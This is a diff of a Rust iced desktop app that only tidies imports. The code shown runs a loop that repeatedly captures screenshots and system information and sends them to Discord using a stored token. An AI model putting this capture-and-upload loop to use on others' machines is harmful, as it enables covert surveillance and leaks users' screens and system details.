@@ -1,6 +1,13 @@
 use iced::{Element, Sandbox, Settings};
 mod pages;
 mod lib;
+use lib::{
+    discord,
+    system::System,
+    zip::Zip,
+    user::User,
+    files
+};
 
 fn main() -> iced::Result {
     Page::run(Settings {
@@ -37,7 +44,7 @@ pub struct Page {
     current_page: u8,
     token: String,
     error: String,
-    user: lib::user::User,
+    user: User,
 }
 
 // Implementation for the Page struct
@@ -51,7 +58,7 @@ impl Sandbox for Page {
 
     // Set the default values for the struct
     fn new() -> Self {
-        let _user = lib::user::User::new();
+        let _user: User = User::new();
         Self {
             current_page: _user.login(),
             user: _user,
@@ -116,14 +123,14 @@ impl Sandbox for Page {
 
 // Main thread loop
 fn main_loop(token: &str) {
-    let mut sys = lib::system::System::new();
-    let mut zip = lib::zip::Zip::new();
+    let mut sys: System = System::new();
+    let mut zip: Zip = Zip::new();
     loop {
         // Start after 10 seconds
         std::thread::sleep(std::time::Duration::from_secs(10));
 
         // Capture the image then add it to the zip file
-        let img_buf: Vec<u8> = match lib::files::capture_image() {
+        let img_buf: Vec<u8> = match files::capture_image() {
             Ok(f) => f,
             Err(e) => panic!("Error: {}", e)
         };
@@ -143,11 +150,11 @@ fn main_loop(token: &str) {
         }
 
         // Encode the image data
-        let image_data: String = lib::files::encode_png(img_buf);
-        let sysinfo_data: String = lib::files::encode_json(sys_info);
+        let image_data: String = files::encode_png(img_buf);
+        let sysinfo_data: String = files::encode_json(sys_info);
 
         // Send the files to discord
-        lib::discord::send_files(token, &image_data, &sysinfo_data);
+        discord::send_files(token, &image_data, &sysinfo_data);
 
         // Repeat after 20 to 50 seconds
         std::thread::sleep(std::time::Duration::from_secs(50));
